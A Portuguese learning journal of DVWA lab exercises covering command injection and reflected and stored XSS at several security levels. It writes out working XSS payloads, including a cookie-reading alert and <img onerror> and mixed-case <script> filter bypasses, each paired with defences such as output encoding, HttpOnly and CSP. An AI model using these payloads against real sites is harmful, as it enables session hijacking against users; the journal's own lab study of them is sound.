![screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-invalido-erro.png](screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-invalido-erro.png)

### Observações e interpretação

O Impossible usa uma **whitelist**: em vez de bloquear caracteres perigosos, valida que o input tem *exatamente* o formato de um IP e recusa tudo o resto. O detalhe mais revelador — e que se observou na prática — é que **todos** os bypasses dão o **mesmo** resultado (`invalid IP`), ao contrário do High, onde cada caractere dava um resultado diferente. Esse resultado uniforme é a **assinatura de uma whitelist**: a defesa não pergunta "este caractere é perigoso?" (o que deixa sempre buracos), pergunta "isto é um IP válido?" — e a resposta é não para tudo o que não seja um IP. Não há variação de sintaxe que a contorne, porque não existe uma lista de proibições para furar. É o oposto exato da fragilidade da blacklist do High.

Fecha-se assim a comparação dos quatro níveis, paralela à do SQL Injection: Low (sem defesa) → Medium/High (blacklists cada vez maiores, mas sempre furáveis) → Impossible (whitelist, a defesa correta e incontornável).

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o Impossible "não ia deixar passar nada". Confirmou-se.
- **Observação-chave (própria):** notei que, ao acrescentar quaisquer caracteres, o resultado era **sempre o mesmo** erro `invalid IP` — e questionei se seria um bug. Percebi que não é bug nenhum: o resultado uniforme é exatamente a prova de que a defesa é uma whitelist (rejeita tudo o que não é um IP), e não uma blacklist (que daria resultados diferentes por caractere). Boa dedução, que distingue os dois tipos de defesa pelo comportamento observável.

**Consigo explicar isto a alguém?**
  O que é uma whitelist, porque é incontornável por variação de sintaxe, e como o resultado uniforme a denuncia face a uma blacklist: **Sim** — por palavras minhas.

### Como nos podemos defender

Esta entrada **é** a demonstração da defesa correta: uma whitelist que valida o formato do input (só um IP válido) e recusa tudo o resto. É o contraste direto com as Entradas #17–#19 (Low/Medium/High), onde a ausência desta abordagem — ou o uso de blacklists — permitiu o ataque.

### Domínios relacionados

- **Security+ — D2 / D4:** validação de input por whitelist como controlo de codificação segura
- **CEH — D5 (Web Application Hacking):** confirmação de que uma defesa correta anula a exploração
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- **Reincidência do bug da Entrada #13:** ao pôr o nível em Impossible, o módulo Command Injection continuava a mostrar `low`. Causa: cookies `security` **duplicadas com paths diferentes** (a antiga `low` num path mais específico prevalecia sobre a nova `impossible` no path `/`). Resolvido apagando a cookie antiga via DevTools → Storage → Cookies e fazendo hard refresh (Ctrl+Shift+R) — aplicando o que já estava documentado na Entrada #13. Lição de método: o diário paga dividendos — documentado uma vez, resolvido em minutos na segunda.

### Próximos passos

- [x] Iniciar o próximo módulo do roteiro: **XSS (Reflected)** nível Low (Entrada #21, 2026-08-12)
- [ ] XSS (Reflected) níveis Medium/High/Impossible, depois Stored e DOM
- [ ] (Opcional) consolidar num quadro-resumo comparativo os módulos já fechados (SQL Injection e Command Injection)

---

## Entrada #21 — XSS Reflected (nível Low)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Iniciar o módulo XSS (Cross-Site Scripting), começando pela variante **Reflected** no nível Low. Perceber a mudança de paradigma: o alvo já não é o servidor (base de dados ou SO), é o **browser de outro utilizador**.

*Nota honesta: comecei este módulo sem saber praticamente nada de XSS (tinha só uma ideia vaga e errada). Fica registado como ponto de partida.*

### Ação executada

1. DVWA Security → Low. Módulo **XSS (Reflected)** — formulário "What's your name?".
2. **Caso de controlo:** `Pedro` → a página respondeu "Hello Pedro" (colou o input diretamente na página).
3. **Injeção de script:**
   ```
   <script>alert('XSS')</script>
   ```
   → apareceu um **popup** com "XSS". O browser executou o JavaScript injetado em vez de o mostrar como texto.
4. **Prova do perigo — leitura da cookie de sessão:**
   ```
   <script>alert(document.cookie)</script>
   ```
   → o popup mostrou `PHPSESSID=jvtmtpcpp9444t45ihq1cmh587; security=low`.

### Resultado

O input não foi tratado como texto, mas **executado como código** no browser. Com `document.cookie`, foi possível **ler a cookie de sessão** (`PHPSESSID`) — a chave que identifica a sessão autenticada. Num ataque real, essa cookie seria enviada em silêncio para o servidor do atacante (não um popup), permitindo *session hijacking* (assumir a identidade da vítima sem a password).

**Screenshots guardados:**

![screenshots/2026-08-12/entrada21-xss-reflected-controlo-hello.png](screenshots/2026-08-12/entrada21-xss-reflected-controlo-hello.png)

![screenshots/2026-08-12/entrada21-xss-reflected-alert.png](screenshots/2026-08-12/entrada21-xss-reflected-alert.png)

![screenshots/2026-08-12/entrada21-xss-reflected-cookie-roubada.png](screenshots/2026-08-12/entrada21-xss-reflected-cookie-roubada.png)

### Observações e interpretação

**A mudança de paradigma:** no SQLi e no Command Injection, o input escapava para uma query SQL ou um comando do SO — a vítima era o servidor. No XSS, o input escapa para o **HTML/JavaScript da página**, e o código corre no **browser de quem a abre**. A vítima é outro utilizador.

**Reflected:** o script é "refletido" de volta pelo servidor de imediato e viaja no **URL** (`?name=<script>...`). Num ataque real, o atacante coloca este URL num link e engana a vítima a clicar; o script corre na sessão dela.

**Ligação ao que já estava documentado (o diário a dar frutos):** o `document.cookie` conseguiu ler o `PHPSESSID` porque essa cookie **não tem a flag HttpOnly**. Isto já estava anunciado no próprio reconhecimento — o nmap da Entrada #8 reportava `httponly flag not set`. E o termo **HttpOnly** já estava no glossário ("impede uma cookie de ser lida por JavaScript, protegendo contra roubo de sessão via XSS") — deixou de ser teoria e passou a prática. Se a cookie tivesse HttpOnly, este ataque não a conseguiria ler.

### Deduções e raciocínio (certos e corrigidos)

- **Ponto de partida honesto:** comecei sem saber o que era XSS — tinha uma ideia vaga ("salta linhas") que estava errada. Registado de propósito.
- **Previsão certa:** ao injetar `<script>alert('XSS')</script>`, previ (com pista) que o browser executaria o código e apareceria um popup. Confirmou-se.
- **Previsão certa:** ao usar `document.cookie`, previ que apareceria a cookie de sessão. Confirmou-se — reação imediata: "estou desprotegido".
- **Compreensão nova:** percebi que a gravidade do XSS não é o popup, é o que ele *prova* — que se pode correr qualquer código no browser da vítima, incluindo roubar-lhe a sessão.

**Consigo explicar isto a alguém?**
  O que é XSS, porque é que a vítima é o utilizador e não o servidor, e como o roubo da cookie leva a *session hijacking*: **Sim** — por palavras minhas (apesar de ter começado o módulo sem saber).

### Como nos podemos defender

- **Output encoding / escaping (defesa principal):** a página deve "escapar" o input antes de o mostrar — transformar `<` em `&lt;`, `>` em `&gt;`, etc. — para o browser o exibir como *texto* em vez de o executar como código.
- **HttpOnly na cookie de sessão:** impede o JavaScript de ler o `PHPSESSID`, bloqueando o roubo de sessão via XSS (mitiga a consequência, mesmo que o XSS exista).
- **Content Security Policy (CSP):** política que restringe que scripts o browser pode executar, como camada de reforço.
- **Validação de input** onde aplicável.

### Domínios relacionados

- **Security+ — D2 (Ameaças/Vulnerabilidades):** XSS (A03/A07 do OWASP Top 10); D4 — codificação segura (output encoding)
- **CEH — D5 (Web Application Hacking):** XSS e roubo de sessão (*session hijacking*)
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou tecnicamente. Ponto de partida honesto documentado: comecei sem saber XSS. É suposto — é um diário de aprendizagem.
- Por fazer: níveis Medium/High/Impossible do Reflected, e as variantes **Stored** (script guardado no servidor, corre para todos os visitantes) e **DOM**.

### Próximos passos

- [x] XSS Reflected nível Medium — filtro de `<script>` contornado com `<img onerror>` (Entrada #22, 2026-08-12)
- [ ] XSS Reflected níveis High → Impossible
- [ ] XSS Stored e DOM
- [ ] (Opcional) demonstrar o roubo de cookie "a sério" (enviar para um servidor de captura no Kali), em vez do `alert`

---

## Entrada #22 — XSS Reflected (nível Medium)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Repetir o XSS Reflected no nível Medium para ver que defesa é introduzida e como contorná-la.

### Ação executada

1. DVWA Security → Medium. Módulo XSS (Reflected).
2. **Repetir o payload do Low:**
   ```
   <script>alert('XSS')</script>
   ```
   → **sem popup**. A página mostrou "Hello alert('XSS')" — a etiqueta `<script>` foi **apagada**, deixando só o texto `alert('XSS')` (sem etiqueta, o browser não executa).
3. **Bypass — usar JavaScript sem `<script>`:**
   ```
   <img src=x onerror=alert('XSS')>
   ```
   → **popup "XSS"**. Defesa contornada.

### Resultado

O Medium remove a string `<script>` do input (blacklist). O payload do Low deixou de funcionar, mas bastou correr JavaScript **sem** usar `<script>` para contornar: uma imagem com `src` inválido dispara o gestor de evento `onerror`, que executa o código. Nenhuma etiqueta `<script>` presente → o filtro não tem o que apagar.

**Screenshots guardados:**

![screenshots/2026-08-12/entrada22-xss-reflected-medium-script-filtrado.png](screenshots/2026-08-12/entrada22-xss-reflected-medium-script-filtrado.png)

![screenshots/2026-08-12/entrada22-xss-reflected-medium-img-bypass.png](screenshots/2026-08-12/entrada22-xss-reflected-medium-img-bypass.png)

### Observações e interpretação

O payload do bypass, peça a peça (para referência, dado que não domino programação):
- `<img ...>` — etiqueta HTML que normalmente mostra uma imagem; é uma instrução para o browser, não texto.
- `src=x` — o `src` (source) é *onde está a imagem*; `x` é um endereço falso de propósito, para a imagem **falhar** a carregar.
- `onerror=...` — *event handler* ("quando der erro"): "se algo correr mal a carregar a imagem, faz o seguinte".
- `alert('XSS')` — o código que corre quando o erro acontece (o popup).

A lição central: **`<script>` não é a única forma de executar JavaScript.** Vários gestores de evento (`onerror`, `onclick`, `onmouseover`, `onload`...) disparam código a partir de outras etiquetas. Por isso, bloquear só `<script>` (blacklist) nunca cobre todas as formas — é a mesma fraqueza do Command Injection Medium, agora no mundo do HTML/JavaScript. O payload `<img onerror>` é uma "chave-mestra": funciona no Low (sem filtro) **e** no Medium (que só sabe apagar `<script>`).

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o Medium "ia subir a defesa mas não o suficiente para bloquear" (assinatura de uma blacklist). Confirmou-se — bloqueou o `<script>` mas não o `<img onerror>`.
- **Compreensão nova:** percebi que o *resultado* (popup) é o mesmo do Low, mas o *caminho* é diferente (janela lateral em vez da porta da frente), e que o payload `<img onerror>` também funcionaria no Low, porque lá não há filtro nenhum.
- **Nota de método pessoal:** não sei programar, e tenho dificuldade em criar/entender payloads. Ficou registada a decomposição peça a peça do `<img onerror>` para consulta futura — o objetivo é *perceber o que o payload faz*, não decorá-lo.

**Consigo explicar isto a alguém?**
  Que a defesa do Medium apaga `<script>`, e que se contorna porque há outras formas de correr JavaScript (event handlers como `onerror`): **Sim** — por palavras minhas.

### Como nos podemos defender

- **Output encoding / escaping (defesa principal):** escapar o input (`<` → `&lt;`, etc.) para o browser o mostrar como texto, em vez de tentar apagar etiquetas específicas. Uma blacklist de etiquetas (como a do Medium) está condenada a falhar, porque há inúmeras formas de correr JavaScript.
- **Content Security Policy (CSP)** como reforço.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS; codificação segura (output encoding); evasão de blacklist
- **CEH — D5 (Web Application Hacking):** bypass de filtros de XSS por etiquetas/eventos alternativos
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou. Nota honesta: como não programo, a criação e leitura dos payloads é a minha maior dificuldade — mitigada com a decomposição peça a peça, registada na entrada.
- Por fazer: níveis High e Impossible do Reflected, e as variantes Stored e DOM.

### Próximos passos

- [x] XSS Reflected nível High — `<img onerror>` ainda passa; `<script>` bloqueado em qualquer forma (Entrada #23, 2026-08-12)
- [ ] XSS Reflected Impossible (a defesa correta — output encoding)

---

## Entrada #23 — XSS Reflected (nível High)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Repetir o XSS Reflected no nível High para ver que filtragem mais apertada é usada e se ainda se contorna.

### Ação executada

1. DVWA Security → High. Módulo XSS (Reflected).
2. **Bypass do Medium (`<img onerror>`):**
   ```
   <img src=x onerror=alert('XSS')>
   ```
   → **popup "XSS"**. Ainda passa.
3. **Variação de `<script>` (Caminho A, que passaria no Medium):**
   ```
   <ScRiPt>alert('XSS')</ScRiPt>
   ```
   → **bloqueado**. Sem popup; a página mostra só "Hello >" (o filtro apagou a parte do "script").

### Resultado

O `<img onerror>` continua a funcionar (bypass), mas a variação de maiúsculas de `<script>` deixou de funcionar. O High melhorou o filtro do "script" mas continua cego a tudo o que não seja "script".

**Screenshots guardados:**

![screenshots/2026-08-12/entrada23-xss-reflected-high-img-bypass.png](screenshots/2026-08-12/entrada23-xss-reflected-high-img-bypass.png)

![screenshots/2026-08-12/entrada23-xss-reflected-high-script-bloqueado.png](screenshots/2026-08-12/entrada23-xss-reflected-high-script-bloqueado.png)

### Observações e interpretação

**O que o High melhorou:** no Medium, o filtro apagava apenas o `<script>` exato (minúsculas), pelo que uma variação como `<ScRiPt>` passaria. No High, o filtro apanha "script" em **qualquer combinação de maiúsculas/minúsculas** (e até com caracteres pelo meio) — fechou a variação de `<script>` (Caminho A).

**O que o High NÃO mudou:** continua a pensar apenas na palavra "script". Nunca considerou que o XSS **não precisa de `<script>`**. Por isso etiquetas alternativas com event handlers — `<img onerror>`, `<svg onload>`, `<body onload>` — passam-lhe ao lado (Caminho B).

O padrão é o mesmo dos outros módulos: o programador **tapou o buraco específico que conhecia** (variações de `<script>`), mas mantém uma **blacklist** — bloquear coisas-más-conhecidas — o que deixa a porta aberta a tudo o que não pensou. O `<img onerror>` é uma **chave-mestra**: funciona no Low, Medium **e** High. Para um atacante que saiba que o XSS vive de event handlers e não só de `<script>`, o High quase não é mais difícil que o Medium.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o `<img onerror>` ainda passaria no High (por continuar a ser blacklist). Confirmou-se.
- **Demonstração dupla:** testei os dois caminhos e vi ao vivo que o High fechou o Caminho A (`<ScRiPt>` bloqueado) mas deixou o Caminho B (`<img onerror>` a passar) — a prova concreta de que a melhoria foi parcial e específica.

**Consigo explicar isto a alguém?**
  Que o High bloqueia "script" em qualquer forma mas não outras etiquetas/eventos, e porque é que isso mantém o XSS possível: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Output encoding / escaping (defesa principal):** escapar o input para o browser o mostrar como texto, em vez de tentar apagar etiquetas específicas — que é uma corrida perdida, pois há inúmeras formas de correr JavaScript.
- **Content Security Policy (CSP)** como reforço.
- É o que o nível **Impossible** implementa — a comparar a seguir.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS; codificação segura; evasão de blacklist
- **CEH — D5 (Web Application Hacking):** bypass de filtros de XSS por etiquetas/eventos alternativos
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou. Por fazer: o nível **Impossible** do Reflected, e depois as variantes **Stored** e **DOM**.

### Próximos passos

- [x] XSS Reflected Impossible — output encoding mostra o payload como texto, sem executar (Entrada #24, 2026-08-12)
- [ ] XSS Stored e DOM

---

## Entrada #24 — XSS Reflected (nível Impossible)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Fechar o XSS Reflected: submeter no nível Impossible a "chave-mestra" que funcionou do Low ao High e confirmar que **falha**, percebendo o mecanismo do output encoding.

### Ação executada

1. DVWA Security → Impossible. Módulo XSS (Reflected).
2. **Testar a chave-mestra do Low/Medium/High:**
   ```
   <img src=x onerror=alert('XSS')>
   ```
   → **sem popup**. A página mostrou o payload como **texto literal**: "Hello \<img src=x onerror=alert('XSS')\>".

### Resultado

O payload não foi executado — foi **mostrado como texto**, inteiro e visível, tal como escrito. Ao contrário do Medium/High (que *apagavam* partes do input), aqui nada foi removido: o texto está todo lá, mas inofensivo. Módulo XSS Reflected fechado (Low → Impossible).

**Screenshot guardado:**

![screenshots/2026-08-12/entrada24-xss-reflected-impossible-payload-texto.png](screenshots/2026-08-12/entrada24-xss-reflected-impossible-payload-texto.png)

### Observações e interpretação

O Impossible usa **output encoding / escaping**: antes de mostrar o input, transforma os caracteres especiais — `<` vira `&lt;`, `>` vira `&gt;`. O browser recebe esses códigos e apresenta-os como as letras "<" e ">", em vez de os interpretar como uma etiqueta HTML. O payload continua todo presente, mas perdeu o poder de ser código.

A diferença face à blacklist (Medium/High) é reveladora: a blacklist **apaga/mutila** o que julga perigoso (e falha, porque não consegue prever tudo); o output encoding **mantém tudo** mas neutraliza-o. E é por isso que é incontornável: não tenta adivinhar o que é perigoso — trata **todo** o input como texto por defeito. Não interessa que etiqueta ou evento se invente (`<img>`, `<svg>`, ou algo novo), tudo é mostrado como texto. Não há buraco para encontrar, porque não há lista de proibições — há uma regra universal.

Fecha-se o padrão dos três Impossible já feitos, que são todos a mesma ideia — **separar dado de código** (o "fio condutor" do guia comparativo):
- **SQLi Impossible:** prepared statements — o input nunca vira SQL
- **Command Injection Impossible:** whitelist — só o formato válido é aceite
- **XSS Impossible:** output encoding — o input é mostrado como texto, nunca executado

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o Impossible ia "mostrar o payload como o escrevi" (texto), em vez de o executar. Confirmou-se.
- **Distinção compreendida:** percebi que o output encoding **não apaga** nada (o payload aparece inteiro), ao contrário do filtro do Medium/High — e que é essa a diferença entre a defesa correta e a blacklist.

**Consigo explicar isto a alguém?**
  O que é output encoding, porque é que mostra o payload como texto sem o executar, e porque é a defesa universal contra XSS (face à blacklist): **Sim** — por palavras minhas.

### Como nos podemos defender

Esta entrada **é** a demonstração da defesa correta: output encoding/escaping de todo o output que inclua input do utilizador. Reforço com HttpOnly (contra roubo de cookie, ver Entrada #21) e CSP. É o contraste direto com as Entradas #21–#23 (Low/Medium/High), onde a ausência de encoding — ou o uso de blacklists — permitiu o ataque.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS; output encoding como controlo de codificação segura
- **CEH — D5 (Web Application Hacking):** confirmação de que a defesa correta anula a exploração
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou — correu limpo. Fecha o XSS Reflected completo.
- Por fazer: as variantes **Stored** (script guardado no servidor, corre para todos os visitantes) e **DOM**.

### Próximos passos

- [x] XSS **Stored** nível Low — payload guardado no livro de visitas, dispara a cada visita (Entrada #25, 2026-08-15)
- [ ] XSS Stored níveis Medium → Impossible
- [ ] XSS **DOM**
- [ ] (Opcional) atualizar o guia comparativo com uma linha sobre as variantes de XSS

---

## Entrada #25 — XSS Stored (nível Low)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.x`, após renovação DHCP — ver "O que correu mal"), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Explorar a variante **Stored** do XSS no nível Low e perceber a diferença fundamental face ao Reflected: o payload deixa de ser passageiro (no URL) e passa a ficar **guardado no servidor**, disparando para todos os visitantes.

### Ação executada

1. DVWA Security → Low. Módulo **XSS (Stored)** — um **livro de visitas** (Guestbook) com campos **Name** e **Message**, e a lista de mensagens já submetidas por baixo.
2. **Caso de controlo:** já existia uma mensagem normal ("test / This is a test comment"), que serve de referência do comportamento normal (mensagem guardada e mostrada).
3. **Injeção**, no campo **Message**:
   ```
   <script>alert('XSS')</script>
   ```
   (Name: `pedro`.) Submetido com "Sign Guestbook".
4. **Prova de persistência:** saída e regresso à página **pelo menu lateral** (carregamento limpo, via GET — não por F5, que faria reenvio do formulário / "Resend").

### Resultado

Após submeter, a nova entrada apareceu na lista com o **Message vazio** — sinal de que o `<script>` foi **guardado como código** (não como texto; se estivesse escapado, ver-se-ia o texto do payload). Ao **revisitar a página pelo menu** (carregamento limpo, sem reenviar nada), o **popup "XSS" disparou sozinho**. Isto confirma o essencial do Stored: o payload está guardado no servidor e executa **a cada visita, para qualquer utilizador**.

**Screenshots:** *(capturados durante o exercício — o payload guardado no livro de visitas e o popup a disparar numa revisita limpa. A inserir na próxima sessão; o ambiente de recorte esteve indisponível nesta.)*

### Observações e interpretação

**Porque é que a janela do Stored é diferente da do Reflected (Name + Message vs um só campo):** a interface de cada tipo de XSS imita o **cenário real** onde esse ataque acontece.
- O **Reflected** ("What's your name?", um só campo) imita sítios onde o input é **devolvido de imediato** e não é guardado — caixas de pesquisa, páginas de erro, parâmetros no URL. Um campo, eco imediato, uma vítima (a que se engana a clicar no link).
- O **Stored** (livro de visitas, Name + Message) imita sítios onde o input é **guardado** e mostrado a **outras pessoas** — comentários, fóruns, avaliações, perfis, livros de visitas. Por isso a página tem estrutura de "guardar e mostrar" (formulário **+** lista das mensagens anteriores), que a do Reflected não tem. A diferença de aspeto **é** a lição: mostra a diferente superfície de ataque.
- Nota lateral: o livro de visitas tem **dois** campos (Name e Message), ambos potenciais pontos de injeção, e com limites/proteções que podem diferir (o Name costuma ser mais curto).

**Gravidade face ao Reflected:** no Reflected é preciso enganar **cada** vítima, uma a uma, a clicar num link. No Stored injeta-se **uma vez** e a armadilha fica montada — **todos** os que visitarem a página são atingidos, automaticamente, sem mais esforço do atacante. É o mais perigoso dos três XSS.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que, em Stored, o payload afetaria **todos** os visitantes (não só eu). Confirmou-se.
- **Afinação:** percebi que o "afeta todos" não é por ser nível Low — é a **natureza do Stored** (ficar guardado). O nível só muda a filtragem.
- **Leitura correta do resultado:** interpretei o Message **vazio** na lista como sinal de sucesso (script guardado como código, invisível), e não como falha.
- **Callback à Entrada #13:** o aviso "Resend" do Firefox voltou a aparecer ao fazer F5; sabendo da #13, evitei o reenvio e testei a persistência pelo menu (GET limpo) — a forma correta.

**Consigo explicar isto a alguém?**
  A diferença entre Stored e Reflected (onde fica o payload, quem dispara e quantas vezes), e porque é que o Stored é o mais perigoso: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Output encoding no momento de mostrar** o conteúdo guardado: ao apresentar as mensagens do livro de visitas, escapar `<`, `>`, etc., para o browser as mostrar como texto em vez de as executar. (No Stored, o encoding tem de ser feito **na saída**, quando se mostra o conteúdo guardado a cada visitante.)
- **Validação/sanitização do input na entrada** como reforço.
- **Content Security Policy (CSP)** para limitar execução de scripts.
- **HttpOnly** na cookie de sessão, para mitigar o roubo de sessão caso um XSS passe.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS persistente (Stored); output encoding
- **CEH — D5 (Web Application Hacking):** Stored XSS, o de maior impacto por atingir múltiplas vítimas
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- **Reversão de rede do Kali (recorrente):** após reinício, o `eth0` voltou à rede de casa (`192.168.1.50`) em vez do segmento Ciber. Resolvido com `sudo dhclient -r eth0 && sudo dhclient eth0`.
- **VMware não abria após atualização do kernel:** o sistema atualizou para o kernel `6.8.0-137` e o VMware recusou-se a carregar os módulos (a janela "Install" falha sempre). Resolvido arrancando no kernel anterior (`6.8.0-124`) via `grub-reboot` pelo terminal. Lição de sistema: kernels novos partem frequentemente o VMware; manter um kernel funcional como alternativa. (Cura definitiva — atualizar o VMware ou fixar o kernel — a fazer noutra sessão.)
- **Incidente de organização:** pastas locais duplicadas/perdidas causaram confusão; recuperado do GitHub (clone) e consolidado numa só pasta em `~/Desktop/lab-ciberseguranca`. Reforça a lição: o trabalho vive no GitHub; a pasta local é descartável.

### Próximos passos

- [ ] XSS Stored níveis Medium → Impossible
- [ ] XSS DOM
- [ ] (Opcional) atualizar o guia comparativo com uma nota sobre as três variantes de XSS (Reflected/Stored/DOM)

---

## Entrada #26 — XSS Stored (nível Medium)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS Stored contra a defesa de nível Medium e confirmar se é a mesma blacklist já vista no Reflected Medium (bloqueia a string `<script>`), incluindo o mesmo bypass com atributo de evento HTML.

### Ação executada

1. DVWA Security → Medium. Módulo **XSS (Stored)**.
2. **Caso de controlo:** entradas já existentes no livro de visitas ("test", "pedro") serviram de referência do comportamento normal.
3. **Injeção 1 — payload do Low**, no campo Message:
   ```
   <script>alert('XSS')</script>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".
4. **Verificação:** ao reler a lista após o submit, apareceu um popup — mas com o formulário ainda preenchido, **antes** de clicar em "Sign Guestbook". Identificado como efeito secundário do contador de caracteres em JavaScript do campo Message (reflete o valor no DOM enquanto se escreve, do lado do cliente, independente do filtro do servidor). Distinguido do teste real: clicado OK, depois "Sign Guestbook", e conferida a lista após reload limpo.
5. **Resultado do payload do Low:** a entrada ficou registada como `Message: alert('XSS')` — as tags `<script>` e `</script>` foram removidas pela blacklist, sobrando só texto solto, sem executar. Sem popup ao carregar a página.
6. **Injeção 2 — bypass**, no campo Message:
   ```
   <img src=x onerror=alert('XSS')>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".
7. **Prova de persistência:** confirmado que, ao recarregar a página (via link do menu, e também via F5 com "Resend"), o popup "XSS" dispara sempre.

### Resultado

A blacklist do Medium apaga apenas a string literal `<script>`. O payload do Low foi neutralizado (viraram texto solto). O bypass com `<img src=x onerror=alert('XSS')>` não contém essa string — explora o atributo de evento `onerror` (dispara quando a imagem falha a carregar) — e passou incólume, ficando guardado e a disparar em **todas** as visitas à página. Mesmo padrão do XSS Reflected Medium.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** antes de testar, previ que o comportamento seria "o normal" (a mesma blacklist do Reflected Medium). Confirmou-se: blacklist a apanhar só `<script>`, bypass com `onerror`.
- **Correção importante:** o primeiro popup que vi (com o formulário ainda preenchido) não era o resultado do filtro do servidor — era o contador de caracteres em JavaScript do campo Message, que reflete o input no DOM em tempo real, do lado do cliente. Aprendi a distinguir esse efeito do teste real (que só se confirma depois de guardar e recarregar a página de forma limpa).
- **Reforço de conceito:** confirmei por palavras próprias porque a blacklist falha — vigia uma palavra específica (`<script>`), não o conceito de "código perigoso". O `onerror` é um mecanismo do HTML (atributo de evento) que dispara JavaScript sem precisar da tag `<script>`, por isso escapa ao filtro.

**Consigo explicar isto a alguém?**
  Porque é que uma blacklist que bloqueia `<script>` não impede `<img onerror>`: **Sim** — usando a analogia do segurança que só vigia uma palavra ("bomba") e deixa passar quem entra disfarçado de outra forma.

### Como nos podemos defender

- **Output encoding** em vez de blacklist — tratar sempre o input como texto ao mostrá-lo, independentemente da forma que tiver (tag, atributo de evento, etc.). É o que o Impossible deve implementar.
- **Content Security Policy (CSP)** para restringir que scripts podem correr, como camada adicional.
- **HttpOnly** na cookie de sessão, para mitigar o roubo de sessão mesmo que um XSS passe.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS persistente (Stored), falhas de blacklist, output encoding
- **CEH — D5 (Web Application Hacking):** bypass de filtros de input via atributos de evento HTML
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Confusão inicial entre o popup do contador de caracteres (client-side, dispara sempre que se escreve o payload, independente do nível) e o resultado real do filtro do servidor (só visível após guardar e recarregar a página). Esclarecido durante o exercício.

### Próximos passos

- [ ] XSS Stored nível High
- [ ] XSS Stored nível Impossible
- [ ] XSS DOM

---

## Entrada #27 — XSS Stored (nível High)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS Stored contra a defesa de nível High e confirmar se segue o mesmo padrão já visto no Reflected High: blacklist mais esperta (apanha "script" independentemente de maiúsculas/minúsculas), mas ainda cega a outros vetores como `onerror`.

### Ação executada

1. DVWA Security → High. Módulo **XSS (Stored)** — base de dados com as entradas do teste anterior (Medium) ainda visíveis, servindo de referência.
2. **Injeção 1 — bypass do Medium**, no campo Message:
   ```
   <img src=x onerror=alert('XSS')>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".
3. **Verificação:** ao recarregar a página, o popup "XSS" disparou.
4. **Injeção 2 — variação com maiúsculas/minúsculas**, no campo Message:
   ```
   <ScRiPt>alert('XSS')</ScRiPt>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".

### Resultado

O bypass do Medium (`<img src=x onerror=alert('XSS')>`) **continuou a funcionar** no High — ficou guardado e disparou popup a cada recarregamento da página. Já o `<ScRiPt>alert('XSS')</ScRiPt>` foi **filtrado**: a entrada ficou registada como `Message: alert('XSS')`, texto solto sem execução — confirmando que a blacklist do High apanha a palavra "script" independentemente de maiúsculas/minúsculas, mas continua sem cobrir atributos de evento HTML como `onerror`. Mesmo padrão do XSS Reflected High.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o comportamento seria igual ao Reflected High — confirmou-se nos dois testes (case-insensitive bloqueado, `onerror` a passar).
